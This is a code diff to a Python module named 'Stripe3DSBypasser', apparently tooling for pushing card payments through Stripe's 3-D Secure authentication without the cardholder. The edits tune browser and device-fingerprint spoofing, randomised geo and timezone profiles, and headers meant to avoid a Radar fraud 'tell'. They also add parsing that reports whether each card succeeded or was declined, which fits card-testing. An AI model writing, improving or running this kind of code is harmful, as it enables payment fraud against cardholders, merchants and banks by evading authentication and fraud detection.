@@ -11,6 +11,7 @@ import base64
 import hashlib
 import random
 import asyncio
+import html
 from typing import Dict, Optional, Any
 from urllib.parse import urlencode, urljoin
 from curl_compat import ChromeSession
@@ -103,28 +104,30 @@ async def _json(resp) -> Any:
     return await j() if callable(j) else j
 
 
-def _html_challenge(html: str) -> bool:
-    low = html.lower()
+def _html_challenge(html_text: str) -> bool:
+    low = html_text.lower()
     if any(k in low for k in _CHALLENGE_MARKERS):
         return True
-    if re.search(r'type=["\']password["\']', html, re.I) and not re.search(r"<form[^>]+action=", html, re.I):
+    if re.search(r'type=["\']password["\']', html_text, re.I) and not re.search(r"<form[^>]+action=", html_text, re.I):
         return True
-    return bool(re.search(r'name=["\'](?:otp|passcode|code|token)["\']', html, re.I))
+    # Do not match generic "code" or "token" which hit CSRF / anti-forgery hidden inputs
+    return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', html_text, re.I))
 
 
-def _parse_form(html: str, base_url: str = ""):
+def _parse_form(html_text: str, base_url: str = ""):
     action = None
-    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
+    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html_text, re.I)
     if m:
-        raw_action = m.group(1)
+        raw_action = html.unescape(m.group(1))
         action = urljoin(base_url, raw_action) if base_url else raw_action
     fields = {}
-    for tag in re.finditer(r"<input[^>]+>", html, re.I):
+    for tag in re.finditer(r"<input[^>]+>", html_text, re.I):
         t = tag.group(0)
         n = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
         v = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
         if n:
-            fields[n.group(1)] = v.group(1) if v else ""
+            val = html.unescape(v.group(1)) if v else ""
+            fields[n.group(1)] = val
     return action, fields
 
 
@@ -141,7 +144,8 @@ class Stripe3DSBypasser:
     ) -> tuple:
         prof = profile or {}
         cc = (country_code or prof.get("country_code") or "US").upper()
-        tz_offset = prof.get("tz_offset") or random.choice(GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"]))
+        # 0 is falsy in Python (e.g. GB/IE GMT = 0) — must check is not None
+        tz_offset = prof.get("tz_offset") if prof.get("tz_offset") is not None else random.choice(GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"]))
         if prof.get("screen_width") and prof.get("screen_height"):
             width, height = int(prof["screen_width"]), int(prof["screen_height"])
         else:
@@ -208,9 +212,14 @@ class Stripe3DSBypasser:
     @staticmethod
     def _as_id(val) -> str:
         if isinstance(val, str) and val:
+            # Reject payment_intent, setup_intent, and payment_method IDs — they 400 on /v1/3ds2/authenticate
+            if val.startswith(("pi_", "seti_", "pm_")):
+                return ""
             return val
         if isinstance(val, dict):
-            return val.get("id") or val.get("three_d_secure_2_source") or ""
+            cand = val.get("id") or val.get("three_d_secure_2_source") or ""
+            if cand and not str(cand).startswith(("pi_", "seti_", "pm_")):
+                return str(cand)
         return ""
 
     @classmethod
@@ -277,17 +286,17 @@ class Stripe3DSBypasser:
             return
 
         device_fp_url = None
-        m = re.search(r'submitDataAndForm\(["\']+(https://[^"\']+/devicefingerprint)["\']', html)
+        m = re.search(r'submitDataAndForm\(["\']+(https?://[^"\']+/devicefingerprint)["\']', html)
         if m:
             device_fp_url = m.group(1)
         elif "safekey" in html.lower() or "deviceidentification" in html.lower():
-            m_action = re.search(r'<form[^>]+action=["\']+(https://[^"\']+)["\']', html, re.I)
+            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
             if m_action:
-                device_fp_url = m_action.group(1)
+                device_fp_url = urljoin(method_url, html.unescape(m_action.group(1)))
         if not device_fp_url:
-            m_action = re.search(r'<form[^>]+action=["\']+(https://[^"\']+)["\']', html, re.I)
+            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
             if m_action and "fingerprint" in m_action.group(1).lower():
-                device_fp_url = m_action.group(1)
+                device_fp_url = urljoin(method_url, html.unescape(m_action.group(1)))
 
         if device_fp_url:
             seed = (profile or {}).get("fp_seed") or server_trans_id
@@ -451,6 +460,7 @@ class Stripe3DSBypasser:
             "source": source_id,
             "client_secret": client_secret,
             "one_click_authn": "false",
+            "payment_user_agent": STRIPE_JS_UA,
             "browser": {
                 "fingerprintAttempted": True,
                 "challengeWindowSize": "05",
@@ -469,11 +479,14 @@ class Stripe3DSBypasser:
         if browser_info.get("threeDSServerTransID"):
             auth_body["browser"]["threeDSServerTransID"] = browser_info["threeDSServerTransID"]
 
-        ua = (profile or {}).get("user_agent", UA)
+        # Dual-write three_ds_2_response for older Basil builds
+        auth_body["three_ds_2_response"] = {
+            "threeDSCompInd": "Y",
+            "browser": dict(auth_body["browser"]),
+        }
+
+        # Keep User-Agent clean (no radar tell concatenation); Stripe-Version stays in headers
         auth_headers = cls._stripe_headers(profile, json_accept=True)
-        # payment_user_agent and Stripe-Version are part of Stripe's fraud detection check
-        auth_headers["User-Agent"] = f"{ua} {STRIPE_JS_UA}"
-        auth_headers["payment_user_agent"] = STRIPE_JS_UA
         auth_headers["Stripe-Version"] = "2020-08-27"
 
         try:
@@ -568,6 +581,18 @@ class Stripe3DSBypasser:
                         pi_fresh = await _json(pi_r)
                     if isinstance(pi_fresh, dict):
                         pi_obj = pi_fresh.get("payment_intent") or pi_fresh.get("setup_intent") or pi_fresh
+                        stat = pi_obj.get("status")
+                        if stat in ("succeeded", "complete", "requires_capture"):
+                            return {"success": True, "status": stat, "raw_response": pi_fresh}
+                        if stat == "requires_payment_method":
+                            err = pi_obj.get("last_payment_error") or pi_obj.get("last_setup_error") or pi_fresh.get("error") or {}
+                            return {
+                                "success": False,
+                                "status": "declined",
+                                "decline_code": err.get("decline_code") or err.get("code") or "card_declined",
+                                "error": err.get("message") or "Card declined",
+                                "raw_response": pi_fresh,
+                            }
                         fresh_na = pi_obj.get("next_action") or {}
                         fresh_sdk = cls._merge_sdk(fresh_na)
                         if fresh_sdk:
@@ -713,7 +738,7 @@ class Stripe3DSBypasser:
             if not acs_url:
                 m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
                 if m_url:
-                    acs_url = m_url.group(1)
+                    acs_url = urljoin(final_url, html.unescape(m_url.group(1)))
 
             if acs_url and form_data:
                 async with session.post(
@@ -781,7 +806,7 @@ class Stripe3DSBypasser:
             if attempt < 5:
                 await asyncio.sleep(1.5)
 
-        # Poll exhausted — if still requires_action, re-enter 3DS handler once on updated next_action
+        # Poll exhausted — if still requires_action, re-enter 3DS handler once on updated next_action (depth=1 to avoid loop)
         if isinstance(last_d, dict) and last_d.get("status") == "requires_action" and _reenter:
             pi_obj = last_d.get("payment_intent") or last_d.get("setup_intent") or last_d
             updated_na = pi_obj.get("next_action") or last_d.get("next_action")
@@ -791,9 +816,9 @@ class Stripe3DSBypasser:
                 if act == "redirect_to_url":
                     red_url = (updated_na.get("redirect_to_url") or {}).get("url")
                     return await cls._resolve_redirect_url(
-                        session, red_url, pi_id, updated_cs, pk_key, profile, depth=0)
+                        session, red_url, pi_id, updated_cs, pk_key, profile, depth=1)
                 return await cls._resolve_3ds2_sdk(
-                    session, updated_na, updated_cs, pk_key, profile, depth=0)
+                    session, updated_na, updated_cs, pk_key, profile, depth=1)
 
         if isinstance(last_d, dict):
             return {"success": False, "status": last_d.get("status", "unknown"), "raw_response": last_d}
